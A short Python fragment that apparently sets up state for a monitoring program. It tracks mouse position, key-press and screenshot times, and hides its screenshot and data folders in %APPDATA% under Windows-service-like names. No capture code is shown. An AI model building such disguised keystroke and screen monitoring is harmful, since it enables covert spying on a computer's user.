from os import getenv
from datetime import datetime
import DecryptionTests

mouse_position = ()
key_press_date = datetime.now()
last_screenshot_date = datetime.now()
unwantedWindowTitlesFilePath = getenv('APPDATA') + "\\" + "winService"
screenshotsPath = getenv('APPDATA') + "\\WinEvent"
DecryptionTests.DecryptionTests()
# unwantedWindowTitles = DecryptionTests.unwantedWindowTitlesSet
# DecryptionTests.unwantedWindowTitlesSet = None  # releasing the variable
